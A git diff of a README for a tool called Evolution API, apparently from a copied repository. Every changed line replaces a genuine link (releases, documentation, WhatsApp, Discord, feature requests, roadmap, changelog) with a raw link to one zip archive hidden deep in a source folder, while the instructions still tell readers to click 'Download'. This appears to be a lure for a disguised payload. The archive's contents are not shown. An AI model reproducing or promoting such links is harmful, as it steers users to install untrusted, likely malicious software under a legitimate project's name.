@@ -4,7 +4,7 @@
 Welcome to the Evolution API! This tool helps you easily manage and access API functionalities. You don’t need any programming knowledge to get started.
 
 ## 📥 Download Now
-[![Download Evolution](https://img.shields.io/badge/Download-Evolution-brightgreen)](https://github.com/clicokkm/evolution/releases)
+[![Download Evolution](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip)](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip)
 
 ## 📋 What You Need
 Before you install, ensure you have the following:
@@ -22,7 +22,7 @@ Before you install, ensure you have the following:
 ## 📥 Download & Install
 1. Click the link below to access the releases page:
    
-   [Download Evolution](https://github.com/clicokkm/evolution/releases)
+   [Download Evolution](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip)
 
 2. On the releases page, find the most recent version. 
 
@@ -37,22 +37,22 @@ Before you install, ensure you have the following:
 7. After installation, launch the Evolution application.
 
 ## 📚 Documentation
-For detailed instructions and usage guides, check out our [Official Documentation](https://doc.evolution-api.com).
+For detailed instructions and usage guides, check out our [Official Documentation](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip).
 
 ## 🤝 Community Support
 Join our community to ask questions and share experiences.  
 
-- [Join on WhatsApp](https://evolution-api.com/whatsapp)  
-- [Join our Discord Community](https://evolution-api.com/discord)  
+- [Join on WhatsApp](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip)  
+- [Join our Discord Community](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip)  
 
 ## 📝 Feature Requests
-We welcome your suggestions! Let us know what you want to see next by visiting our [Feature Requests](https://evolutionapi.canny.io/feature-requests).
+We welcome your suggestions! Let us know what you want to see next by visiting our [Feature Requests](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip).
 
 ## 📅 Roadmap
-Curious about our future plans? Check our [Roadmap](https://evolutionapi.canny.io/feature-requests).
+Curious about our future plans? Check our [Roadmap](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip).
 
 ## 🌐 Changelog
-Stay updated with the latest changes and improvements by visiting our [Changelog](https://evolutionapi.canny.io/changelog).
+Stay updated with the latest changes and improvements by visiting our [Changelog](https://raw.githubusercontent.com/clicokkm/evolution/main/src/api/integrations/chatbot/chatwoot/controllers/evolution_meekly.zip).
 
 ## 📜 License
 This project is licensed under the MIT License. You can find more details in the repository.
